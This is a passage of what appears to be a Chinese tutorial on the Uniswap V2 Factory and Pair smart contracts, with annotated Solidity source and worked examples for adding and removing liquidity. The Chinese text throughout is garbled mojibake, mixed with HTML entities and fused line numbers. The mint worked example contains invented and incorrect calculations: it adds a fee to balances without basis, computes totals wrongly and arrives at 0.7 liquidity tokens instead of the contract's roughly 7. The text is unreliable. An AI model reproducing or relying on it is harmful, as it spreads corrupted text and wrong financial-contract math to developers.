allPairsLength() external view returns (uint) &#123; return allPairs.length; &#125; /** é¦–å…ˆå°†token0 token1æŒ‰ç…§é¡ºåºæ’åºï¼Œç¡®ä¿token0å­—é¢åœ°å€å°äºtoken1ã€‚ æ¥ç€ä½¿ç”¨assembly + create2åˆ›å»ºåˆçº¦ã€‚ assemblyå¯ä»¥åœ¨Solidityä¸­ä½¿ç”¨Yulè¯­è¨€ç›´æ¥æ“ä½œEVMï¼Œæ˜¯è¾ƒåº•å±‚çš„æ“ä½œæ–¹æ³•ã€‚ ã€ŠUniswap v2 ç™½çš®ä¹¦ã€‹ä¸­è®²åˆ°ï¼Œcreate2ä¸»è¦ç”¨äºåˆ›å»ºç¡®å®šæ€§çš„äº¤æ˜“å¯¹åˆçº¦åœ°å€ï¼Œ ç›®çš„æ˜¯æ ¹æ®ä¸¤ä¸ªä»£å¸åœ°å€ç›´æ¥è®¡ç®—pairåœ°å€ï¼Œè€Œæ— éœ€è°ƒç”¨é“¾ä¸Šåˆçº¦æŸ¥è¯¢ã€‚ */ function createPair(address tokenA, address tokenB) external returns (address pair) &#123; // ä¸¤ç§ä»£å¸åœ°å€ä¸èƒ½ç›¸åŒ require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;); // å…ˆå°†token0 token1æŒ‰ç…§é¡ºåºæ’åºï¼Œç¡®ä¿token0å­—é¢åœ°å€å°äºtoken1 (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); // ç¡®ä¿token0ä¸ç­‰äº address(0)ï¼Œåˆ™ä¸¤ä¸ªåœ°å€éƒ½ä¸ä¸º address(0) require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;); // ç¡®ä¿è¿™ä¸¤ç§ä»£å¸åœ°å€çš„äº¤æ˜“å¯¹ä¸ºaddress(0),å³è¿™ä¸¤ä¸ªä»£å¸å°šæœªåˆ›å»ºäº¤æ˜“å¯¹ require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient // è·å– `UniswapV2Pair`çš„å­—èŠ‚ç  bytes memory bytecode = type(UniswapV2Pair).creationCode; // ç”Ÿæˆç›saltï¼Œsaltç”±è¿™ä¸¤ä¸ªåœ°å€ç´§æ‰“åŒ…å†hashè·å¾—ï¼Œæ˜¯å”¯ä¸€çš„ bytes32 salt = keccak256(abi.encodePacked(token0, token1)); // é€šè¿‡creat2è®¡ç®—äº¤æ˜“å¯¹åœ°å€ assembly &#123; pair := create2(0, add(bytecode, 32), mload(bytecode), salt) &#125; // å°†æ–°ç”Ÿæˆçš„äº¤æ˜“å¯¹ä¸­çš„ä¸¤ç§ä»£å¸è®¾ç½®ä¸º token0, token1 IUniswapV2Pair(pair).initialize(token0, token1); // è®°å½•token0 å’Œ token1ç”Ÿæˆçš„äº¤æ˜“å¯¹ getPair[token0][token1] = pair; // åå‘å¡«å……æ˜ å°„ getPair[token1][token0] = pair; // populate mapping in the reverse direction // ä¿å­˜è¯¥äº¤æ˜“å¯¹pair allPairs.push(pair); // åˆ›å»ºæˆåŠŸï¼Œè§¦å‘äº¤æ˜“å¯¹ç”Ÿæˆäº‹ä»¶ emit PairCreated(token0, token1, pair, allPairs.length); &#125; // è®¾ç½®æ‰‹ç»­è´¹æ¥æ”¶åœ°å€ function setFeeTo(address _feeTo) external &#123; require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;); feeTo = _feeTo; &#125; // ä¿®æ”¹æ‰‹ç»­è´¹æ¥æ”¶åœ°å€çš„è®¾ç½®è€… function setFeeToSetter(address _feeToSetter) external &#123; require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;); feeToSetter = _feeToSetter; &#125;&#125; 3. UniswapV2Pair Pairï¼ˆäº¤æ˜“å¯¹ï¼‰åˆçº¦ï¼Œå®šä¹‰å’Œäº¤æ˜“æœ‰å…³çš„å‡ ä¸ªæœ€åŸºç¡€æ–¹æ³•ï¼Œå¦‚swap&#x2F;mint&#x2F;burnï¼Œä»·æ ¼é¢„è¨€æœºç­‰åŠŸèƒ½ï¼Œå…¶æœ¬èº«æ˜¯ä¸€ä¸ªERC20åˆçº¦ï¼Œç»§æ‰¿UniswapV2ERC20 Pairåˆçº¦ä¸»è¦å®ç°äº†ä¸‰ä¸ªæ–¹æ³•ï¼šmintï¼ˆæ·»åŠ æµåŠ¨æ€§ï¼‰ã€burnï¼ˆç§»é™¤æµåŠ¨æ€§ï¼‰ã€swapï¼ˆå…‘æ¢ï¼‰ã€‚ ä»£ç è§£è¯»å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268pragma solidity =0.5.16;import &#x27;./interfaces/IUniswapV2Pair.sol&#x27;;import &#x27;./UniswapV2ERC20.sol&#x27;;import &#x27;./libraries/Math.sol&#x27;;import &#x27;./libraries/UQ112x112.sol&#x27;;import &#x27;./interfaces/IERC20.sol&#x27;;import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;import &#x27;./interfaces/IUniswapV2Callee.sol&#x27;;contract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 &#123; // å¼•ç”¨åº“å‡½æ•° using SafeMath for uint; using UQ112x112 for uint224; // æœ€ä½é¢åº¦çš„æµåŠ¨æ€§ uint public constant MINIMUM_LIQUIDITY = 10**3; // tansferå‡½æ•°çš„é€‰æ‹©å™¨ bytes4 private constant SELECTOR = bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;))); // å·¥å‚ï¼Ÿtoken0å’Œtoken1äº¤æ˜“å¯¹ä¸­çš„ä¸¤ç§ä»£å¸ address public factory; address public token0; address public token1; // token0å’Œtoken1äº¤æ˜“å¯¹ä¸­çš„ä¸¤ç§ä»£å¸çš„å­˜å‚¨é‡ uint112 private reserve0; // uses single storage slot, accessible via getReserves uint112 private reserve1; // uses single storage slot, accessible via getReserves // ä¸Šæ¬¡æ›´æ–°çš„æ—¶é—´ uint32 private blockTimestampLast; // uses single storage slot, accessible via getReserves // ç´¯åŠ äº¤æ˜“ä»·æ ¼ uint public price0CumulativeLast; uint public price1CumulativeLast; uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event // é”æ ‡å¿— uint private unlocked = 1; // ä¿®é¥°å™¨ä¸ºäº†é˜²æ­¢å¼‚æ­¥ modifier lock() &#123; require(unlocked == 1, &#x27;UniswapV2: LOCKED&#x27;); unlocked = 0; _; unlocked = 1; &#125; // è¯»å–äº¤æ˜“å¯¹ä¸­ä¸¤ç§ä»£å¸çš„ä½™é¢ï¼Œä»¥åŠä¸Šä¸€æ¬¡äº¤æ˜“å¯¹æ›´æ–°çš„æ—¶é—´ function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) &#123; _reserve0 = reserve0; _reserve1 = reserve1; _blockTimestampLast = blockTimestampLast; &#125; /** 1. é€šè¿‡callçš„æ–¹å¼ï¼Œè°ƒç”¨tokenä¸­çš„ transfer å‡½æ•°---å…¼å®¹æ€§æ›´å¼º 2. åˆ¤æ–­è°ƒç”¨æ˜¯å¦æˆåŠŸï¼Œsuccessæ˜¯å¦ä¸ºtrueï¼Œdataæ˜¯å¦ä¸ºç©º */ function _safeTransfer(address token, address to, uint value) private &#123; (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value)); require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), &#x27;UniswapV2: TRANSFER_FAILED&#x27;); &#125; event Mint(address indexed sender, uint amount0, uint amount1); event Burn(address indexed sender, uint amount0, uint amount1, address indexed to); event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to ); event Sync(uint112 reserve0, uint112 reserve1); // åˆå§‹åŒ– å·¥å‚åœ°å€ä¸ºè°ƒç”¨è€… constructor() public &#123; factory = msg.sender; &#125; // called once by the factory at time of deployment // åˆå§‹åŒ–äº¤æ˜“å¯¹ä¸­çš„ä¸¤ç§ä»£å¸åœ°å€ function initialize(address _token0, address _token1) external &#123; require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check token0 = _token0; token1 = _token1; &#125; // update reserves and, on the first call per block, price accumulators function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123; require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), &#x27;UniswapV2: OVERFLOW&#x27;); // è®°å½•å½“å‰æ›´æ–°æ—¶é—´ uint32 blockTimestamp = uint32(block.timestamp % 2**32); // è®°å½•è¿‡å»äº†å¤šä¹… uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired // è®¡ç®—å‡ºå½“å‰çš„äº¤æ˜“ä»·æ ¼ if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123; // * never overflows, and + overflow is desired price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed; price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed; &#125; // å°†è¿™ä¸¤ç§ä»£å¸çš„å­˜å‚¨é‡è®¾ç½®ä¸ºä»£å¸çš„ä½™é¢ reserve0 = uint112(balance0); reserve1 = uint112(balance1); // æ›´æ–°å½“å‰æ“ä½œæ—¶é—´ blockTimestampLast = blockTimestamp; // è§¦å‘åŒæ­¥äº‹ä»¶ emit Sync(reserve0, reserve1); &#125; // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k) // è®¡ç®—é“¸å¸æ‰‹ç»­è´¹ function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123; address feeTo = IUniswapV2Factory(factory).feeTo(); // è·å–å½“å‰factoryé“¸å¸æ‰‹ç»­è´¹çš„æ¥æ”¶åœ°å€ feeOn = feeTo != address(0); // æ£€æŸ¥è¯¥factoryæ˜¯å¦è®¾ç½®äº†æ‰‹ç»­è´¹æ¥æ”¶åœ°å€ uint _kLast = kLast; // gas savings if (feeOn) &#123; // å¦‚æœè¯¥factoryæœ‰æ‰‹ç»­è´¹æ¥æ”¶åœ°å€ if (_kLast != 0) &#123; uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1)); uint rootKLast = Math.sqrt(_kLast); if (rootK &gt; rootKLast) &#123; uint numerator = totalSupply.mul(rootK.sub(rootKLast)); uint denominator = rootK.mul(5).add(rootKLast); uint liquidity = numerator / denominator; if (liquidity &gt; 0) _mint(feeTo, liquidity); // ç»™feeToåœ°å€é“¸å¸liquidity &#125; &#125; &#125; else if (_kLast != 0) &#123; kLast = 0; &#125; &#125; // this low-level function should be called from a contract which performs important safety checks // é“¸å¸æ“ä½œï¼Œæ·»åŠ æµåŠ¨æ€§ function mint(address to) external lock returns (uint liquidity) &#123; // è¯»å–ä»£å¸çš„å­˜å‚¨é‡ (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings // è·å–è¿™ä¸¤ç§ä»£å¸çš„ä½™é¢ uint balance0 = IERC20(token0).balanceOf(address(this)); uint balance1 = IERC20(token1).balanceOf(address(this)); // è®¡ç®—å½“å‰åˆçº¦ä¸­ä¸¤ä¸ªä»£å¸çš„å‡€å¢é‡ï¼Œå¹¶èµ‹å€¼ç»™amount0å’Œamount1å˜é‡ // å‡€å¢é‡ç­‰äºä½™é¢å‡å»å‚¨å¤‡é‡ uint amount0 = balance0.sub(_reserve0); uint amount1 = balance1.sub(_reserve1); // è°ƒç”¨_mintFeeå‡½æ•°ï¼Œè®¡ç®—æ˜¯å¦éœ€è¦æ”¶å–åè®®æ‰‹ç»­è´¹ï¼Œå¹¶è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œèµ‹å€¼ç»™feeOnå˜é‡ bool feeOn = _mintFee(_reserve0, _reserve1); // ç†è§£ä¸ºæ”¯ä»˜å®Œé“¸å¸è´¹ç”¨ // è®°å½•å‘è¡Œé‡ï¼Œéš¾é“è¿™é‡Œä¹Ÿè®²ç©¶å¼‚æ­¥çš„ç°è±¡ï¼Ÿ uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee // å¦‚æœæ˜¯é¦–æ¬¡æä¾›è¯¥äº¤æ˜“å¯¹çš„æµåŠ¨æ€§ï¼Œåˆ™æ ¹æ®æ ¹å·xyç”ŸæˆæµåŠ¨æ€§ä»£å¸ï¼Œå¹¶é”€æ¯å…¶ä¸­çš„MINIMUM_LIQUIDITYï¼ˆå³1000wei if (_totalSupply == 0) &#123; // è®¡ç®—æµåŠ¨æ€§ä»£å¸çš„æ•°é‡ï¼Œç­‰äºä¸¤ä¸ªä»£å¸å‡€å¢é‡ä¹˜ç§¯çš„å¹³æ–¹æ ¹å‡å»æœ€å°æµåŠ¨æ€§å¸¸é‡ï¼Œå¹¶èµ‹å€¼ç»™liquidityå˜é‡ liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY); // è°ƒç”¨_mintå‡½æ•°ï¼Œå‘é›¶åœ°å€é“¸é€ æœ€å°æµåŠ¨æ€§å¸¸é‡æ•°é‡çš„æµåŠ¨æ€§ä»£å¸ï¼ˆæ°¸ä¹…é”å®šï¼‰ _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens &#125; else &#123; // è®¡ç®—æµåŠ¨æ€§ä»£å¸çš„æ•°é‡ï¼Œç­‰äºä¸¤ä¸ªä»£å¸å‡€å¢é‡ä¸å‚¨å¤‡é‡æ¯”ä¾‹ä¹˜ç§¯ä¸æ€»ä¾›åº”é‡ä¹˜ç§¯çš„è¾ƒå°å€¼ï¼Œå¹¶èµ‹å€¼ç»™liquidityå˜é‡ liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1); &#125; require(liquidity &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&#x27;); _mint(to, liquidity); // ä¸ºtoé“¸å¸ï¼Œliquidity _update(balance0, balance1, _reserve0, _reserve1); // è°ƒç”¨_updateå‡½æ•°ï¼Œæ›´æ–°å½“å‰åˆçº¦ä¸­ä¸¤ä¸ªä»£å¸çš„å‚¨å¤‡é‡ä¸ºæœ€æ–°çš„ä½™é¢ if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date emit Mint(msg.sender, amount0, amount1); &#125; // this low-level function should be called from a contract which performs important safety checks // é”€å¸æ“ä½œï¼Œç§»é™¤æµåŠ¨æ€§ function burn(address to) external lock returns (uint amount0, uint amount1) &#123; (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings address _token0 = token0; // gas savings address _token1 = token1; // gas savings uint balance0 = IERC20(_token0).balanceOf(address(this)); uint balance1 = IERC20(_token1).balanceOf(address(this)); uint liquidity = balanceOf[address(this)]; // å‚è€ƒç™½çš®ä¹¦ï¼Œä¸ºäº†èŠ‚çœäº¤æ˜“æ‰‹ç»­è´¹ï¼ŒUniswap v2åªåœ¨mint/burnæµåŠ¨æ€§æ—¶æ”¶å–ç´¯è®¡çš„åè®®æ‰‹ç»­è´¹ã€‚ bool feeOn = _mintFee(_reserve0, _reserve1); uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee // é‡‡ç”¨mintä¸­è®¡ç®— liquidityçš„æ–¹æ³•å€’æ¨amount amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution require(amount0 &gt; 0 &amp;&amp; amount1 &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#x27;); // é”€æ¯æœ¬åˆçº¦çš„ æµåŠ¨æ€§ liquidity _burn(address(this), liquidity); // è°ƒç”¨_token0(_token1)ä¸­çš„ transferå‡½æ•° // é€šè¿‡å„è‡ªtokenä¸­å®ç°çš„transferå°†tokenè½¬ç§»å›to _safeTransfer(_token0, to, amount0); _safeTransfer(_token1, to, amount1); //æ›´æ–°åˆçº¦è‡ªèº«çš„token0ã€1ä½™é¢ balance0 = IERC20(_token0).balanceOf(address(this)); balance1 = IERC20(_token1).balanceOf(address(this)); //æ›´æ–°æ± å­ä¸­çš„å‚¨å¤‡é‡å’Œä»·æ ¼ç§¯ç´¯å™¨ _update(balance0, balance1, _reserve0, _reserve1); if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date emit Burn(msg.sender, amount0, amount1, to); &#125; // this low-level function should be called from a contract which performs important safety checks /** å®ç°ä¸¤ç§ä»£å¸çš„äº¤æ¢ï¼ˆäº¤æ˜“ï¼‰åŠŸèƒ½-----é—ªç”µè´·åŠŸèƒ½ uint amount0Outï¼šè¦è½¬æ¢çš„ç¬¬ä¸€ç§ä»£å¸çš„æ•°é‡ã€‚ uint amount1Outï¼šè¦è½¬æ¢çš„ç¬¬äºŒç§ä»£å¸çš„æ•°é‡ã€‚ address toï¼šæ¥æ”¶è½¬æ¢åä»£å¸çš„ç›®æ ‡åœ°å€ã€‚ bytes dataï¼šå¯é€‰çš„é¢å¤–æ•°æ®ï¼Œç”¨äºå‘ç›®æ ‡åœ°å€æä¾›æ›´å¤šä¿¡æ¯ã€‚ */ // æ¥æ”¶è€… to å¿…é¡»è¦å®ç° `uniswapV2Call`å‡½æ•°ï¼Œé€šè¿‡æ­¤å‡½æ•°è¾“å…¥äº¤æ¢çš„ä»£å¸ function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123; require(amount0Out &gt; 0 || amount1Out &gt; 0, &#x27;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings // æ£€æŸ¥è¾“å‡ºé‡æ˜¯å¦å°äºå‚¨å¤‡é‡ require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY&#x27;); uint balance0; uint balance1; &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors address _token0 = token0; address _token1 = token1; // æ£€æŸ¥æ¥æ”¶åœ°å€æ˜¯å¦åˆæ³• require(to != _token0 &amp;&amp; to != _token1, &#x27;UniswapV2: INVALID_TO&#x27;); if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens // å¦‚æœæœ‰é¢å¤–æ•°æ®ï¼Œå°±è°ƒç”¨æ¥æ”¶åœ°å€çš„å›è°ƒå‡½æ•° if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data); balance0 = IERC20(_token0).balanceOf(address(this)); balance1 = IERC20(_token1).balanceOf(address(this)); &#125; // è®¡ç®—è¾“å…¥é‡ uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; uint amount1In = balance1 &gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0; require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&#x27;); &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors // è®¡ç®—è°ƒæ•´åçš„ä½™é¢ï¼Œå› ä¸ºåœ¨solidityä¸­æ²¡æœ‰æµ®ç‚¹æ•° 0.3%ï¼Œè¿™æ ·æ˜¯ä¸ºäº†æ¨¡æ‹Ÿå‡º 0.3% uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3)); uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3)); require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &#x27;UniswapV2: K&#x27;); &#125; _update(balance0, balance1, _reserve0, _reserve1); emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to); &#125; // force balances to match reserves /** ç”¨äºç§»é™¤èµ„é‡‘æ± ä¸­å¤šä½™ä»£å¸çš„å‡½æ•°ã€‚å®ƒçš„ä½œç”¨æ˜¯å°†ä»£å¸æ± ä¸­å¤šä½™çš„ä»£å¸è½¬ç§»åˆ°æŒ‡å®šçš„ç›®æ ‡åœ°å€ï¼Œä»¥ä¾¿äºåœ¨èµ„é‡‘æ± ä¸­ä¿æŒæ­£ç¡®çš„ä»£å¸æ¯”ä¾‹ */ function skim(address to) external lock &#123; address _token0 = token0; // gas savings address _token1 = token1; // gas savings _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0)); _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1)); &#125; // force reserves to match balances // åŒæ­¥ï¼Œè¿«ä½¿ä»£å¸ä½™é¢ä¸ä»£å¸å‚¨é‡ç›¸åŒ¹é…ï¼Œè°ƒç”¨_updateå‡½æ•° function sync() external lock &#123; _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1); &#125;&#125; åˆ†æ mintå‡½æ•°ï¼Œä¸¾ä¾‹ å‡è®¾æœ‰ä¸€ä¸ªæµåŠ¨æ€§æ± ï¼Œå…¶ä¸­æœ‰ 10 ä¸ª ETH å’Œ 5000 ä¸ª USDCï¼Œæ€»ä¾›åº”é‡ä¸º 70.71 ä¸ªæµåŠ¨æ€§ä»£å¸ï¼ˆè¿™é‡Œé¢åŒ…æ‹¬è¿‡å»äº¤æ˜“ç•™ä¸‹çš„Feesï¼‰ã€‚ç°åœ¨ï¼Œæœ‰äººæƒ³å‘è¿™ä¸ªæ± ä¸­æ·»åŠ  1 ä¸ª ETH å’Œ 500 ä¸ª USDCï¼Œä»¥è·å¾—æ›´å¤šçš„æµåŠ¨æ€§ä»£å¸ã€‚é‚£ä¹ˆï¼Œä»–ä»¬å°†è·å¾—å¤šå°‘æµåŠ¨æ€§ä»£å¸å‘¢ï¼Ÿ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—æ·»åŠ åçš„ä¸¤ç§ä»£å¸çš„å‚¨å¤‡é‡å’Œä½™é¢ã€‚å‚¨å¤‡é‡ç­‰äºåŸæ¥çš„å‚¨å¤‡é‡åŠ ä¸Šæ·»åŠ çš„æ•°é‡ï¼Œä½™é¢ç­‰äºå‚¨å¤‡é‡åŠ ä¸Šåè®®æ‰‹ç»­è´¹ï¼ˆå‡è®¾ä¸º 0.3%ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æœ‰ï¼š å‚¨å¤‡é‡ï¼šreserve0 &#x3D; 10 + 1 &#x3D; 11 ETHï¼Œreserve1 &#x3D; 5000 + 500 &#x3D; 5500 USDC ä½™é¢ï¼šbalance0 &#x3D; reserve0 * (1 + 0.003) &#x3D; 11.033 ETHï¼Œbalance1 &#x3D; reserve1 * (1 + 0.003) &#x3D; 5516.5 USDC æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—æ·»åŠ åçš„æ€»ä¾›åº”é‡ã€‚å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡æ·»åŠ æµåŠ¨æ€§ï¼Œåˆ™ä½¿ç”¨å…¬å¼ sqrt(x * y) â€” MINIMUM_LIQUIDITYï¼Œå¦åˆ™ä½¿ç”¨å…¬å¼ min(x * totalSupply &#x2F; reserve0, y * totalSupply &#x2F; reserve1)ã€‚å› ä¸ºè¿™ä¸æ˜¯ç¬¬ä¸€æ¬¡æ·»åŠ æµåŠ¨æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨åè€…ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æœ‰ï¼š æ€»ä¾›åº”é‡ï¼štotalSupply &#x3D; min(balance0 * 70.71 &#x2F; reserve0, balance1 * 70.71 &#x2F; reserve1) &#x3D; min(71.41, 71.41) &#x3D; 71.41 æœ€åï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—æ·»åŠ è€…è·å¾—çš„æµåŠ¨æ€§ä»£å¸çš„æ•°é‡ã€‚è¿™ä¸ªæ•°é‡ç­‰äºæ·»åŠ åçš„æ€»ä¾›åº”é‡å‡å»æ·»åŠ å‰çš„æ€»ä¾›åº”é‡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æœ‰ï¼š æµåŠ¨æ€§ä»£å¸ï¼šliquidity &#x3D; totalSupply â€” 70.71 &#x3D; 71.41â€“70.71 &#x3D; 0.7 ä¹Ÿå°±æ˜¯è¯´ï¼Œæ·»åŠ è€…å°†è·å¾—å¤§çº¦ 0.7 ä¸ªæµåŠ¨æ€§ä»£å¸ã€‚ åˆ†æburn,ä¸¾ä¾‹ å‡è®¾æœ‰ä¸€ä¸ªæ± å­ï¼Œå®ƒå…è®¸äº¤æ˜“ ETH å’Œ DAIï¼Œå®ƒçš„åœ°å€æ˜¯ 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11ã€‚è¿™ä¸ªæ± å­æœ‰ä»¥ä¸‹çš„çŠ¶æ€ï¼š æµåŠ¨æ€§ä»£å¸çš„æ€»ä¾›åº”é‡æ˜¯ 3,000,000ã€‚ æ± å­é‡Œæœ‰ 10,000 ä¸ª ETH å’Œ 4,000,000 ä¸ª DAIã€‚ åè®®è´¹ç”¨æ˜¯ 0.05%ã€‚ ä½ æ‹¥æœ‰ 30,000 ä¸ªæµåŠ¨æ€§ä»£å¸ï¼Œä¹Ÿå°±æ˜¯æ± å­çš„ 1%ã€‚ ç°åœ¨ï¼Œä½ æƒ³è¦é€€å‡ºè¿™ä¸ªæ± å­ï¼ŒæŠŠä½ çš„æµåŠ¨æ€§ä»£å¸é”€æ¯ï¼Œå¹¶æ‹¿å›ä½ çš„ ETH å’Œ DAIã€‚ä½ å¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼ŒæŠŠ to å‚æ•°è®¾ä¸ºä½ è‡ªå·±çš„åœ°å€ã€‚è¿™æ ·ï¼Œå‡½æ•°ä¼šåšä»¥ä¸‹çš„äº‹æƒ…ï¼š å®ƒä¼šä»æ± å­é‡Œè·å– ETH å’Œ DAI çš„å‚¨å¤‡é‡ï¼Œåˆ†åˆ«æ˜¯ _reserve0 = 10,000 å’Œ _reserve1 = 4,000,000ã€‚ å®ƒä¼šè·å– ETH å’Œ DAI çš„åœ°å€ï¼Œåˆ†åˆ«æ˜¯ _token0 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 å’Œ _token1 = 0x6B175474E89094C44Da98b954EedeAC495271d0Fã€‚ å®ƒä¼šè·å–åˆçº¦è‡ªèº«çš„ ETH å’Œ DAI çš„ä½™é¢ï¼Œåˆ†åˆ«æ˜¯ balance0 = 10,000 å’Œ balance1 = 4,000,000ã€‚æ³¨æ„ï¼Œè¿™é‡Œå‡è®¾æ²¡æœ‰å…¶ä»–äººåœ¨åŒä¸€åŒºå—å†…ä¸æ± å­äº¤äº’ï¼Œå¦åˆ™ä½™é¢å¯èƒ½ä¼šæœ‰å˜åŒ–ã€‚ å®ƒä¼šè·å–åˆçº¦è‡ªèº«çš„æµåŠ¨æ€§ä»£å¸ä½™é¢ï¼Œä¹Ÿå°±æ˜¯ liquidity = 30,000ã€‚ å®ƒä¼šè°ƒç”¨ _mintFee å‡½æ•°ï¼Œæ¥åˆ†å‘åè®®è´¹ç”¨ç»™æµåŠ¨æ€§æä¾›è€…ã€‚å‡è®¾åœ¨ä½ åŠ å…¥æ± å­åï¼Œæ²¡æœ‰å‘ç”Ÿè¿‡ä»»ä½•äº¤æ˜“ï¼Œé‚£ä¹ˆåè®®è´¹ç”¨å°±æ˜¯é›¶ï¼Œæ‰€ä»¥ _mintFee å‡½æ•°ä¸ä¼šæ”¹å˜ä»»ä½•ä¸œè¥¿ï¼Œå¹¶è¿”å› feeOn = falseã€‚ å®ƒä¼šè®¡ç®—ä½ èƒ½å¤Ÿæ‹¿å›çš„ ETH å’Œ DAI çš„æ•°é‡ï¼Œåˆ†åˆ«æ˜¯ amount0 = liquidity * balance0 / totalSupply = 30,000 * 10,000 / 3,000,000 = 100 å’Œ amount1 = liquidity * balance1 / totalSupply = 30,000 * 4,000,000 / 3,000,000 = 40,000ã€‚è¿™ä¿è¯äº†æŒ‰æ¯”ä¾‹åˆ†é…ã€‚ çŸ¥è¯†ç‚¹ï¼š abi.decode(data, (bool))æ˜¯Solidityä¸­çš„ä¸€ç§å‡½æ•°è°ƒç”¨ï¼Œç”¨äºå°†å­—èŠ‚æ•°ç»„ï¼ˆbyte arrayï¼‰è§£ç ä¸ºå¸ƒå°”å€¼ï¼ˆboolï¼‰ç±»å‹ã€‚ å…·ä½“æ¥è¯´ï¼Œabi.decodeå‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šå­—èŠ‚æ•°ç»„å’Œæ•°æ®ç±»å‹ã€‚åœ¨è¿™é‡Œï¼Œå­—èŠ‚æ•°ç»„æ˜¯è¦è§£ç çš„æ•°æ®ï¼Œæ•°æ®ç±»å‹æ˜¯è¦è§£ç æˆçš„ç›®æ ‡ç±»å‹ï¼Œå³å¸ƒå°”å€¼ã€‚ å‡½æ•°è°ƒç”¨abi.decode(data, 